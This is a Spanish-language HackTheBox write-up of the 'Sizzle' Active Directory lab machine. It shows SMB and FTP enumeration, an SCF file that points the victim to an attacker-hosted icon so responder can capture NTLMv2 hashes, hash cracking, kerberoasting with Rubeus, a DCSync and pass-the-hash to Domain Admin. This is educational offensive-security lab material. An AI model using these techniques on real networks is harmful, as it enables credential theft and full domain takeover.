---
layout: post
toc: true
title: "Sizzle - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Active Directory, Windows]
author:
  - H4RRIZN
---

![logo]()

# Reconocimiento inicial

Para comenzar realizaremos un scan con nmap para detectar los puertos abiertos en el host victima:

```bash
nmap -sS --min-rate 1500 -p- --open -n -Pn -vv 10.10.10.103
```

![Recon1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled.png)

Tenemos una buena cantidad de puertos abiertos. Realizamos otro scan para detectar las versión sobre los servicios detectados. En este caso ignorare los puertos más altos con servicio **unknown**

```bash
nmap -sCV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001 10.10.10.103 -oN port_scan
```

![Recon2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%201.png)

![Recon3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%202.png)

De las capturamos podemos ver:

- Podemos iniciar sin credenciales al servidor ftp
- Servidor IIS 10.0 en puertos 80 y 443
- El servicio winrm está habilitado para conectarse con y sin ssl

Desde este punto comenzare enumerando el servidor ftp.

# Recon - FTP

Nos conectamos como usuario Anonymous sin credenciales:

![ftp1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%203.png)

Al listar los recursos no tenemos resultados, y al intentar depositar un fichero se nos denegara el acceso:

![ftp2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%204.png)

Con esto en mente y sin mucha información enumerare el servidor web:

# Recon - Web

Al ingresar por http solo se muestra un gif de bacon a la plancha:

![web1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%205.png)

Mediante https vemos lo mismo:

![web2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%206.png)

## Fuzzing

Como no tenemos más que un bacon realizare fuzzing sobre los puertos encontrados comenzando por http. Utilizare la herramienta dirsearch para realizar esto:

```bash
dirsearch -u http://10.10.10.103/ -x 404,403 -t 100
```

![fuzz1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%207.png)

Hemos encontrado un directorio relevante llamado **[certsrv](https://learn.microsoft.com/es-es/system-center/scom/obtain-certificate-windows-server-and-operations-manager?view=sc-om-2022&tabs=Enterp%2CEnter)** el cual corresponde a AD el cual se utiliza para obtener certificados para utilizar con servidores Windows. Lamentablemente al ingresar a esta ruta notamos que se nos solicitan credenciales:

![fuzz2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%208.png)

Si ingresamos mediante https tendremos el mismo resultado, por lo que no realizare fuzzing sobre este puerto ya que es probable que encuentre las mismas rutas.

# Recon - SMB

Como no tenemos credenciales comenzaremos listando los recursos compartidos en smb con una Null Session:

![smb1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%209.png)

Podemos ver que tenemos un recurso llamado **`CertEnroll`** el cual puede tener o no relación con la ruta en el servidor web. Tenemos otro recurso llamado **`Department Shares`** el cual no tiene comentarios al igual que el recurso **`Operations`**.

## CertEnroll

Al conectarnos al recurso de **CertEnroll** con una Null Session se nos deniega el acceso:

![smb2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2010.png)

## Operations

Al ingresar en Operations podemos ver lo mismo:

![smb3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2011.png)

## Department Shares

Al conectarnos con una Null Session a **Department Shares** notamos que tenemos 20 directorios.

![smb4](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2012.png)

Para agilizar la tarea de inspección de estos directorios realizare una montura en mi maquina de atacante para traer estos directorios:

```bash
mkdir /mnt/department
mount -t cifs -o username=h4rri,password=''  '//10.10.10.103/Department Shares' /mnt/department
```

Al ingresar en /mnt/department podemos ver los directorios del recurso smb:

![smb5](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2013.png)

Al inspeccionarlos con **`tree`** notamos que el directorio **`Users`** contiene carpetas con nombres de usuarios los cuales utilizare posteriormente para validarlos. Además de el directorio **`ZZ_ARCHIVE`** el cual contiene ficheros de distintos tipos. 

```bash
.
├── Accounting
├── Audit
├── Banking
│   └── Offshore
│       ├── Clients
│       ├── Data
│       ├── Dev
│       ├── Plans
│       └── Sites
< SNIP >
├── Users
│   ├── Public
│   ├── amanda
│   ├── amanda_adm
│   ├── bill
│   ├── bob
│   ├── chris
│   ├── henry
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   └── mrb3n
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
```

Al inspeccionar el contenido de los ficheros con **`strings`** notamos que no contienen nada y al utilizar **`xxd`** notamos que están llenos de null bytes:

![smb6](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2014.png)

```bash
cat *.ppt | xxd

0005e700: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e710: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e720: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0005e730: 0000 0000 0000 0000 0000 0000 0000 0000  ................
<SNIP>
```

### Enumeración de usuarios validos

Ya que tenemos una recurso que contiene carpetas con nombres de usuarios crearemos una lista para poder enumerar usuarios validos en el AD. Para esto utilizare kerbrute:

```bash
kerbrute userenum -d htb.local --dc 10.10.10.103 users
```

![smb7](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2015.png)

Como podemos ver amanda es un usuario valido. Al intentar depositar un fichero en el directorio de amanda se nos denegará la acción:

![smb8](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2016.png)

A continuación enumerare los directorios en los cuales podría almacenar un fichero malicioso con el fin de que amanda u otro usuario conectado lo solicite para poder conseguir [robar el hash NTLMv2](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).

## SFC File Attack

Para automatizar este proceso utilizare el siguiente script con el fin de recorrer la lista de usuarios como directorios depositando el fichero test.txt hasta encontrar un directorio en el cual se nos permita depositar un fichero:

```bash
for user in $(cat users); do 
    directory="$user"
    if smbclient -D "\Users" -N -c "cd $directory; put test.txt; dir" "\\\\10.10.10.103\\Department Shares" > /dev/null 2>&1; then 
        if smbclient -D "\Users" -N -c "cd $directory; dir" "\\\\10.10.10.103\\Department Shares" 2>/dev/null | grep -q "test.txt"; then
            echo "El archivo fue depositado en el directorio $directory y tiene permisos de escritura."; 
        fi
    fi
done
```

![sfc1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2017.png)

Como se aprecia tenemos permisos de escritura sobre el directorio del usuario Public. Además luego de vigilar el fichero podemos notar que está siendo eliminado:

![sfc2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2018.png)

En base a esto creare un fichero SFC (Shell Command Files):

```bash
[Shell]
Command=2
IconFile=\\10.10.14.27\evil.ico
[Taskbar]
Command=ToggleDesktop
```

Como se ve se esta solicitando un fichero llamado evil.ico desde nuestra dirección IP asignada. Con esto, antes de depositarlo en **`/Users/Public`** iniciaremos responder para capturar el hash NTLMv2:

```bash
responder -I tun0
```

Depositamos el fichero:

![sfc3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2019.png)

Y al esperar un poco podemos ver que hemos recibido el hash de amanda:

![sfc4](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2020.png)

Depositaremos el hash en un fichero para crackearlo, en este caso utilizare hashcat para hacerlo:

```bash
hashcat -m 5600 amanda_hash /usr/share/wordlists/rockyou.txt 
```

![sfc5](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2021.png)

Podemos observar que el resultado nos muestra la contraseña **`Ashare1972`**. Podemos comprobar que estas credenciales son validas utilizando crackmapexec:

![sfc6](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2022.png)

Y son validas contra smb, pero al probarlas contra winrm tenemos un error. Como vimos anteriormente con smbclient no pudimos acceder a los recursos **`CertEnroll`** y **`Operations`**. Así que ingresare nuevamente a estos recursos con las credenciales obtenidas:

![sfc7](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2023.png)

De momento para **`CertEnroll`** no veo nada interesante con lo que poder aprovecharme. Para el recurso de **`Operations`** vemos lo mismo:

![sfc8](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2024.png)

 Si recordamos en el servidor web tenemos un panel de autenticación ubicado en **`https://10.10.10.103/certsrv`**:

![sfc9](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2025.png)

Al ingresar podemos notar que estamos ante Microsoft Active Directory Certificate Services:

![sfc10](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2026.png)

# Shell as amanda

Anteriormente no pudimos conectarnos con las credenciales de amanda contra el servicio de winrm. Podemos generar un certificado para poder conectarnos con **`evil-winrm`** utilizando un certificado y una llave contra el puerto **`5986`** el cual corresponde al servicio winrm a través de SSL. Tenemos que generar una llave (fichero **`.key`**) y un fichero **`.csr`** el cual utilizaremos para generar el certificado:

```bash
openssl req -newkey rsa:2048 -nodes -keyout file.key -out file.csr
```

![sh1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2027.png)

![sh2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2028.png)

A continuación en la web presionamos en **Request a certificate**:

![sh3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2029.png)

Ahora presionamos sobre **advanced certificate request**:

![sh4](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2030.png)

A continuación copiaremos el contenido del fichero **`file.csr`** en el sitio web:

![sh5](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2031.png)

![sh6](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2032.png)

Finalmente descargaremos el certificado en formato **`Base64 encoded`**. Finalmente utilizaremos el certificado y la llave para conectarnos con **`evil-winrm`**:

![sh7](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2033.png)

Al enumerar nuestros privilegios y pertenencias a grupos no vemos nada interesante:

![sh8](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2034.png)

Además la flag tampoco se encuentra en el directorio de nuestro usuario.

## Enum - Bloodhound

Utilizare bloodhound-python para extraer la información de manera local para posteriormente cargarla en Bloodhound:

![bh1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2035.png)

Una vez iniciado Bloodhound cargaremos el fichero **`.zip`** resultante de bloodhound-python, posteriormente marcaremos al usuario amanda como Owned presionando click derecho sobre el nodo y seleccionando **`Mark User as Owned`**:

![bh2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2036.png)

Al presionar en la pestaña de **`Analysis`** podemos buscar por usuarios vulnerables a kerberoasting con el cual podamos obtener un ticket TGS:

![bh3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2037.png)

Vemos que el usuario **`mrlky`** es vulnerable a kerberoasting. Antes de abusar de esto enumerare la forma más rápida de convertirse en Domain Admin:

![bh4](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2038.png)

Como vemos el usuario **`mrlky`** tiene la capacidad de realizar un ataque DCSync sobre **`HTB.LOCAL`**. En base a esto comenzare por abusar del kerberoasting sobre este usuario para posteriormente realizar un DCSync con el objetivo de obtener el hash del usuario Administrator.

# Privesc

Comenzamos por solicitar el ticket TGS del usuario mrlky, para este caso utilizare Rubeus ya que al utilizar **`GetUserSPNs`** no tengo resultados positivos. Cargare Rubeus con evil-winrm en la carpeta de Temp:

![priv1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2039.png)

Observamos que tenemos una restricción y no podemos utilizar evil-winrm para subir ficheros, además de que no podemos listar el contenido de la carpeta Temp, listare la politica de AppLocker para listar alguna ruta en la que podamos descargar contenido.

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

![priv2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2040.png)

Como se ve podemos realizar la ejecución de programas en la carpeta de Windows. Para esto creare una carpeta dentro de la misma carpeta Temp y depositare Rubeus en esta, Para esto montare un servidor con python para hostear el binario de Rubeus:

![priv3](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2041.png)

## Kerberoasting - mrlky

Ahora realizaremos el ataque de kerberoasting con Rubeus sobre el usuario mrlky:

```bash
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap /user:mrlky
```

![kerb1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2042.png)

Ahora depositaremos el hash en un fichero para crackearlo offline:

```bash
hashcat -m 13100 hash rockyou.txt
```

![kerb2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2043.png)

Observamos el resultado de la contraseña del usuario el cual es **`Football#7`**. Ahora estamos a un paso de obtener acceso como administrador.

## DCSync

Sabemos que podemos realizar un DCSync sobre HTB.LOCAL asi que utilizare secretsdump para hacer esto de manera más eficiente:

![dc1](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2044.png)

Ya que obtuvimos los hashes de la base de datos del directorio activo podemos utilizar la tecnica de Pass The Hash para obtener una shell como usuario Administrador. Para este caso utilizare la herramienta psexec:

![dc2](Sizzle%201eb94fca1eec45dcaca180a631c75a14/Untitled%2045.png)

Ya con esto podemos leer las flags ubicadas en el directorio del usuario Administrator y mrlky.

Pwned